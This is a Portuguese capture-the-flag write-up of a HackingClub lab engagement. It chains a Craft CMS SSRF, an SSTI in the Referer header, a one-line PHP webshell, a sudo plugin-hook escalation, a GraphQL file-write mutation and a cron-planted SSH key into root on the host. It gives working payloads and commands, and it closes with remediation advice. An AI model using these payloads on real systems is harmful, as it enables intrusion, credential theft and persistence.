# Journal - HackingClub

**Alvo:** 172.16.6.93 (`byline.hc` / `cms.byline.hc` )
**Aplicação:** Craft CMS 5.9.23
**Data:** 2026-08-07
**Resultado:** **Comprometimento total** — RCE não autenticado → RCE autenticado → root no container → root real no host. Ambas as flags capturadas.

---

## 1. Resumo

A cadeia de exploração combinou **cinco falhas distintas**, cada uma insuficiente sozinha, encadeadas para sair de um visitante anônimo até root no host físico:

| # | Falha | Severidade | Papel na cadeia |
| --- | ------- | ----------- | ------------------ |
| 1 | SSRF não autenticado no Craft CMS (`resource-js`, CVE-2026-55791) | Alta | Vazou credenciais de admin de um serviço interno |
| 2 | SSTI autenticado via header `Referer` (CVE-2026-55794) | Crítica | RCE como usuário `web` dentro do container da aplicação |
| 3 | Regra `sudo NOPASSWD` sobre script que carrega arquivos de um diretório gravável pelo `web` | Crítica | Escalada para **root dentro do container** |
| 4 | API GraphQL interna ("Byline Content API", porta 4000) com autenticação em duas camadas contornável e mutation de escrita arbitrária de arquivo | Crítica | Escrita arbitrária de arquivo **no host** |
| 5 | `cron` real do host + diretório `/root/.ssh` inexistente | Crítica | Persistência → **root interativo no host** |

Nenhuma dessas falhas isoladamente teria mais impacto do que a exploração que dependeu de encadear o vazamento de credenciais de um serviço para autenticar no outro, e usar um primitivo de escrita de arquivo (sem leitura) em conjunto com o `cron` do host como canal de exfiltração/confirmação, já que a rede não permitia shell reverso.

---

## 2. Superfície e reconhecimento inicial

- **Exposto externamente:** apenas TCP/22 (OpenSSH 10.2p1) e TCP/80 (nginx 1.27.5), confirmado por `nmap -p-`.
- **vhosts:** `byline.hc` (fachada estática de jornal) e `cms.byline.hc` (o Craft CMS propriamente dito). Um terceiro vhost, `ops.byline.hc`, existe no `/etc/hosts` mas não é servido externamente (nginx `default_server` devolve 301 para `byline.hc`).
- **Versão do Craft** fixada por hash MD5 do `cp.js` servido (`7001ddd33f5d414bab84d2e78701df40`) contra as tags oficiais do `craftcms/cms` → **5.9.23 exato**, a última release antes do patch de uma RCE crítica em 5.10.0.
- Vetores testados e descartados: `CVE-2024-56145` (register_argc_argv, desligado), `CVE-2025-32432` (generate-transform, corrigido nessa versão), leitura de arquivo local via SSRF (`file://` bloqueado por validação de esquema).

---

## 3. Achado 1 — SSRF não autenticado → vazamento de credenciais (CVE-2026-55791)

**Mecanismo:** a action `admin/actions/app/resource-js` do Craft aceita um parâmetro `url` e um header `X-Forwarded-Host` forjável (a lista `trustedHosts` do Yii aceita qualquer host). Combinando isso com **duplo URL-encoding** do path traversal:

```bash
GET /index.php?p=admin/actions/app/resource-js&url=http://HOST:PORT/cpresources/%252e%252e/PATH
X-Forwarded-Host: HOST:PORT
```

O Yii decodifica uma vez (`%252e%252e` → `%2e%2e`), passando pela validação `ensurePathIsContained` (que só bloqueia `..` literal); o cliente HTTP (Guzzle) decodifica de novo e colapsa o path — resultando numa requisição SSRF arbitrária para `HOST:PORT/PATH`, com o corpo da resposta devolvido inline **apenas se o alvo responder 200** (não-2xx faz o Guzzle lançar exceção e o Craft devolve 500 — usado como oráculo binário de porta aberta/fechada).

**Uso:** varredura da rede Docker interna (`172.18.0.0/16`) através desse SSRF revelou 4 containers vivos. O container `172.18.0.3:8000` (serviço `byline-ops`, correspondente ao vhost `ops.byline.hc`) devolvia um dump de variáveis de ambiente em texto plano na raiz:

```bash
SERVICE=byline-ops RELEASE_CHANNEL=newsroom-prod GENERATED_BY=publish-bot
DB_DRIVER=mysql DB_HOST=db DB_NAME=byline
CMS_PANEL=http://cms.byline.hc/admin
CMS_ADMIN_USER=editor.admin
CMS_ADMIN_PASS_MD5=<REDACTED>
SMTP_HOST=mail.byline.internal SMTP_FROM=press@byline.hc
```

O hash MD5 foi quebrado offline → senha em texto plano **`editorial`**.

**Impacto:** credenciais válidas do painel administrativo do Craft CMS (`editor.admin` / `editorial`), pré-requisito para o próximo achado.

*Nota operacional:* o pool PHP-FPM do alvo é minúsculo e portas com `DROP` de firewall travam ~127s cada — varreduras agressivas via esse SSRF derrubaram a aplicação 3 vezes durante o reconhecimento; o scanner final espaçava sondas em ≥10–18s e aguardava recuperação completa antes de continuar.

---

## 4. Achado 2 — RCE autenticado via SSTI no header `Referer` (CVE-2026-55794)

Vulnerabilidade introduzida no Craft 5.9.0 e corrigida no 5.10.0 — a versão do alvo (5.9.23) é exatamente a última vulnerável.

### 4.1 Causa raiz

`UrlHelper::cpReferralUrl()` devolve o header `Referer` **cru**, sem sanitização, sempre que ele começa com a URL base do painel (`http://cms.byline.hc/admin...`):

```php
public static function cpReferralUrl(): ?string {
    $referrer = Craft::$app->getRequest()->getReferrer();
    if ($referrer === null) return null;
    if (!str_starts_with($referrer, self::baseCpUrl())) return null;
    ...
    return $referrer;
}
```

Essa função é chamada em `ElementsController::actionEdit()`:

```php
$redirectUrl = $this->request->getValidatedQueryParam('returnUrl') ?? UrlHelper::cpReferralUrl() ?? ElementHelper::postEditUrl($element);
```

O `$redirectUrl` é embutido — **assinado via HMAC** — como campo oculto `redirect` no formulário de edição de entry. Ao salvar (`action=elements/apply-draft`), `Controller::getPostedRedirectUrl()` roda esse valor através de `renderObjectTemplate()`, que **não usa o sandbox do Twig** nesse contexto → Server-Side Template Injection.

### 4.2 Exploração passo a passo

1. `GET /admin/entries/stories/new` autenticado, com `Referer: http://cms.byline.hc/admin/{{PAYLOAD}}` — o payload malicioso fica embutido, já assinado pelo servidor, no campo `redirect` da resposta HTML.
2. `POST /index.php` (`action=elements/apply-draft`) reenviando esse mesmo campo `redirect` assinado junto com `elementId`, `draftId`, `siteId`, `elementType`.
3. O servidor renderiza o Twig e devolve o resultado **inline** no campo `"redirect"` da resposta JSON.

### 4.3 Obstáculos encontrados e resolvidos

- **HTTP 400 "Changing an element's ID is not allowed"** — `ElementsController::beforeAction()` rejeita qualquer POST cujo corpo contenha as chaves literais `id`, `uid` ou `canonicalId`. Solução: enviar apenas `elementId` (permitido), nunca `canonicalId`.
- **HTTP 500 com `{{ ['CMD']|map('shell_exec')|join }}`** — os filtros `map`/`filter` do Twig chamam o callback como `$arrow($valor, $chave)`, sempre com **2 argumentos**. `shell_exec()`/`exec()` só aceitam 1 argumento obrigatório → PHP 8 lança `ArgumentCountError` (funções internas agora validam contagem de argumentos) → exceção não capturada → 500.
- **Gadget funcional:** `{{ ['CMD']|map('system')|join }}`. `system(string $command, int &$result_code = null)` tem um segundo parâmetro **opcional e por referência**; a `$chave` do loop (um inteiro real, ex. `0`) se vincula sem erro. Comando executa, stdout vira o retorno do `map`, `join` achata no template.
- **Limitação descoberta:** `system()` ecoa o stdout completo diretamente na saída do PHP, mas **retorna apenas a última linha**. Comandos multi-linha (`ls -la`) ficam truncados nesse canal. Contornado usando o mesmo gadget apenas pelo *efeito colateral* (grava um webshell no webroot), não pelo valor de retorno.

**Payload final:** `{{ ['MARK'~(['CMD']|map('system')|join)]|join }}` — prefixo `MARK` + extração via regex isola a saída do comando dentro da URL de redirect.

**Resultado confirmado:** `id` → `uid=1001(web) gid=1001(web) groups=1001(web)`.

---

## 5. Achado 3 — Webshell + escalada para root dentro do container

Para contornar a limitação de saída em uma linha, o gadget `system()` foi usado uma única vez para **gravar um webshell PHP** no webroot (mundo-gravável, `drwxrwxrwx`):

```php
<?php system($_GET['0']); ?>
```

Gravado via `printf '%s' 'BASE64' | base64 -d > /app/web/cache_XXXX.php`. A partir daí, execução de comando multi-linha completa via HTTP puro, sem depender mais do SSTI.

### 5.1 Privesc para root

Enumeração de sudo revelou:

```bash
User web may run the following commands on <host>:
    (root) NOPASSWD: /usr/local/bin/php /opt/byline/maintenance.php
```

O script `maintenance.php` executa `require_once` em **qualquer arquivo** que bata com `/app/plugins/maintenance-*.php`:

```php
$plugin_dir = "/app/plugins";
foreach (glob($plugin_dir . "/maintenance-*.php") as $hook) {
    require_once($hook);
}
```

Esse diretório é de propriedade do usuário `web` (nós). Bastou gravar `/app/plugins/maintenance-pwn.php` com qualquer PHP arbitrário e rodar `sudo /usr/local/bin/php /opt/byline/maintenance.php` → **execução de código como root, sem senha**, dentro do container.

**Confirmado:** `id` → `uid=0(root) gid=0(root)`.

---

## 6. Tentativa de fuga do container (resultado: bloqueada — hardening correto)

Antes de encontrar o vetor real, foi feita uma varredura completa dos vetores clássicos de *container escape*, todos **negativos**:

- `CapEff = 0000000000000000` — mesmo como uid 0, **zero capabilities efetivas** (sem `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE` etc.).
- Sem `docker.sock` / `containerd.sock` / `crio.sock` em nenhum lugar do filesystem.
- `/dev` só com nós padrão (null, zero, random, tty) — nenhum device de bloco do host.
- `seccomp` ativo com filtro carregado; `cgroup2` montado somente-leitura e namespaced (mata a técnica clássica de `release_agent` de cgroup v1).
- Todos os diretórios relevantes (`/app`, `/opt`, `/var`, `/tmp`, `/etc`) no **mesmo device de filesystem** — nenhum bind-mount do host além dos três arquivos que o próprio Docker/containerd injeta (`resolv.conf`, `hostname`, `hosts`).
- `/etc/periodic/*` e `/etc/crontabs/root` existem (template padrão Alpine) mas **nenhum processo `crond` ativo** dentro do container.
- MySQL (`byline`/`byline-db-pw` @ `db:3306`) só tinha `GRANT ALL` no próprio schema, sem privilégio `FILE` — sem leitura de arquivo via `LOAD_FILE`.
- SSH externo (`byline.hc:22`) aceitava exclusivamente `publickey`, para qualquer usuário testado — sem chave, sem acesso.

Esse container está corretamente isolado — a fuga não veio de uma falha de configuração do container em si, mas de um **serviço externo ao container, alcançável apenas pela rede Docker interna**.

---

## 7. Achado 4 — Serviço "gateway" exposto na rede Docker + autenticação em duas camadas contornável

### 7.1 Descoberta

Com RCE real (não mais limitado pelo pool do PHP-FPM via SSRF), uma varredura assíncrona (`stream_socket_client` + `stream_select`, ~22 mil sondas em <1 min) cobrindo toda a `172.18.0.0/24` revelou que o **gateway da bridge Docker**, `172.18.0.1` — endereço tipicamente vinculado a processos rodando **diretamente no host**, não em containers — tinha as portas **22, 80 e 4000** abertas. A porta 4000 nunca havia sido varrida antes.

```bash
GET http://172.18.0.1:4000/
→ {"graphql":"/graphql","service":"Byline Content API","version":"2.1.0"}
```

Um serviço Flask/Werkzeug rodando no host, atrás de um endpoint GraphQL — quase certamente o "publish-bot" já referenciado no vazamento de env do achado 1 (`GENERATED_BY=publish-bot`).

### 7.2 Schema exposto (introspecção sem autenticação)

```graphql
type Query { user(id: Int): User }
type User { id: Int, name: String, email: String, role: String, token: String }
type Mutation {
  updateUserRole(id: Int, role: String): UpdateResult
  exportContent(path: String, content: String, adminToken: String): ExportResult
}
```

`exportContent` é um **primitivo de escrita arbitrária de arquivo** — sem equivalente de leitura no schema.

### 7.3 Enumeração de usuários (rate limit: 5 req/min)

A API implementa um parser GraphQL "artesanal" (aliases são ignorados, sempre devolve o primeiro `user(id:N)` da query — não é uma lib GraphQL real). Enumeração sequencial (~13s entre requisições) revelou:

| id | email | role | token |
| ---- | ------- | ------ | ------- |
| 1–4 | reporters | reporter | `tok_rpt_*` |
| 5–6 | editors | editor | `tok_edt_*` |
| **7** | **<devops@byline.hc>** | **admin** | **`<REDACTED>`** |
| 8 | <ceo@byline.hc> | reporter | (isca — cargo alto, permissão baixa) |

### 7.4 Contornando a autenticação de `exportContent`

Tentativas iniciais devolviam `"Forbidden: internal gateway token required"`. Ao adicionar o header `X-Gateway-Token`, a mensagem mudou para `"Forbidden: valid adminToken required"` — revelando que são **dois fatores de autenticação independentes**:

1. **Header `X-Gateway-Token`** — precisa ser o valor de `.gw_token` (`<REDACTED>`), encontrado horas antes em `/root/.gw_token` **dentro do container CMS** (artefato sem uso aparente até este ponto da cadeia).
2. **Argumento `adminToken`** da mutation — precisa ser um token de usuário com `role=admin` (`<REDACTED>`, do achado 7.3).

Com os dois presentes, a escrita foi confirmada funcional:

```graphql
mutation {
  exportContent(
    path: "/etc/cron.d/pwn",
    content: "...",
    adminToken: "<REDACTED>"
  ) { ok message }
}
```

Header: `X-Gateway-Token: <REDACTED>`
→ `{"ok": true, "message": "Exported to /etc/cron.d/pwn"}`

Escrita **arbitrária de path absoluto no filesystem do host**, sem qualquer restrição de diretório observada.

---

## 8. Achado 5 — De escrita arbitrária a shell root no host

`exportContent` não tem canal de leitura — não dava para simplesmente escrever e conferir o resultado. A saída encontrada foi usar o próprio `cron` real do host (diferente do container, que não tinha `crond` ativo) como **executor** e, ao mesmo tempo, como **canal de persistência que também serve de confirmação**:

```cron
* * * * * root mkdir -p /root/.ssh && echo '<chave-pública-ed25519>' >> /root/.ssh/authorized_keys && chmod 700 /root/.ssh && chmod 600 /root/.ssh/authorized_keys
```

Gravado em `/etc/cron.d/pwn` via `exportContent`. O motivo do SSH externo aceitar apenas `publickey` e sempre rejeitar (mesmo para `root`) ficou claro retroativamente: **`/root/.ssh` simplesmente não existia** no host — nenhuma chave nunca havia sido cadastrada.

Dentro de ~75 segundos (uma execução do cron, que roda a cada minuto):

```bash
$ ssh -i <chave-plantada> root@byline.hc 'id; hostname'
uid=0(root) gid=0(root) groups=0(root)
ip-172-16-6-93
```

O `hostname` (`ip-172-16-6-93`, formato típico de instância AWS) confirma que esta é a **máquina física/VM real**, não mais um container (o container tinha hostname `a5e1e3974a8e`).

---

## 9. Flags capturadas

```bash
root:  /root/root.txt              → hackingclub{user_flag}
user:  /home/byline-ops/user.txt   → hackingclub{root_flag}
```

---

## 10. Cadeia completa (resumo visual)

```bash
Visitante anônimo
   │  SSRF (CVE-2026-55791, resource-js, double-encoded traversal)
   ▼
Leitura de env do container "byline-ops" (172.18.0.3:8000)
   │  CMS_ADMIN_USER + CMS_ADMIN_PASS_MD5 (crackeado → "editorial")
   ▼
Login autenticado no Craft CP (editor.admin / editorial)
   │  SSTI no header Referer (CVE-2026-55794), gadget map('system')
   ▼
RCE como "web" dentro do container CMS
   │  sudo NOPASSWD sobre maintenance.php + dir de plugins gravável
   ▼
root DENTRO do container CMS
   │  (fuga de container tentada e corretamente bloqueada)
   │  scan de rede interno revela gateway Docker 172.18.0.1:4000
   ▼
GraphQL "Byline Content API" (roda no HOST, fora de qualquer container)
   │  .gw_token (achado antes, sem uso até aqui) + token de admin enumerado
   ▼
exportContent() = escrita arbitrária de arquivo NO HOST
   │  /etc/cron.d/pwn → cron real do host cria authorized_keys em 60s
   ▼
root REAL no host (SSH) → root.txt + user.txt
```

---

## 11. Causas raiz e recomendações

| # | Causa raiz | Recomendação |
| --- | ----------- | --------------- |
| 1 | SSRF na action `resource-js` por validação de path incompleta (só bloqueia `..` literal, não formas duplamente codificadas) e `trustedHosts` permissivo | Normalizar o path uma única vez antes de validar; restringir `trustedHosts`; a action interna não deveria confiar em host/URL fornecidos pelo cliente |
| 2 | Serviço interno (`byline-ops`) expõe variáveis de ambiente completas, incluindo hash de senha, em endpoint sem autenticação | Nunca expor dump de env por HTTP, nem internamente; usar secrets manager |
| 3 | `UrlHelper::cpReferralUrl()` retorna o `Referer` sem sanitização e o valor chega a `renderObjectTemplate()` sem sandbox do Twig | Atualizar para Craft ≥5.10.0 (correção oficial já existe); nunca renderizar template com dados de header controláveis pelo cliente |
| 4 | Regra de `sudoers` executa `require_once` sobre um glob dentro de diretório gravável pelo usuário não-privilegiado | Sudo rules nunca devem apontar para scripts que carregam código de diretórios graváveis por usuários de menor privilégio; usar allowlist de hash/imutabilidade |
| 5 | Serviço GraphQL interno confia que "estar na rede Docker" = confiável, expõe introspecção sem autenticação, tokens de usuário em texto plano na query, rate-limit por IP contornável trivialmente (não é controle de autenticação), e a mutation de escrita de arquivo aceita qualquer path absoluto do host | Desabilitar introspecção em produção; nunca devolver tokens em queries de leitura; autenticação forte (não múltiplos segredos estáticos compartilhados) para mutations privilegiadas; **nunca** expor um primitivo de escrita de arquivo com path controlado pelo cliente, especialmente vinculado a locais sensíveis como `/etc/cron.d` |
| 6 | `sshd` do host permite `PasswordAuthentication no` mas isso só protege depois que `/root/.ssh` existe corretamente restrito — a ausência total do diretório não foi um controle, foi coincidência | Provisionar `authorized_keys` com o mínimo necessário desde o primeiro boot; monitorar integridade de `/etc/cron.d` e `~/.ssh` |

---

## 12. Ferramentas e artefatos gerados

- `pwn.py` / `rce.py` — PoC completa do SSTI autenticado (login, injeção, extração de saída).
- Webshell PHP efêmero em `/app/web/cache_XXXX.php`, gate por parâmetro `k` secreto gerado por execução.
- Hook malicioso `/app/plugins/maintenance-pwn.php`, reescrito a cada etapa de reconhecimento pós-root-no-container (leitura de `/proc/1/environ`, varredura de rede, enumeração MySQL, teste de mutation GraphQL).
- Scanner assíncrono de rede interna (PHP `stream_socket_client`/`stream_select`) para varrer `172.18.0.0/24` sem os limites do pool FPM do SSRF original.
- Par de chaves SSH ed25519 gerado sob demanda para a persistência final no host (efêmero, não versionado).

---

*Relatório gerado a partir de um engajamento autorizado em ambiente de laboratório controlado (HackingClub). Todos os hosts, credenciais e tokens aqui listados pertencem exclusivamente ao ambiente de CTF e não têm validade fora dele.*
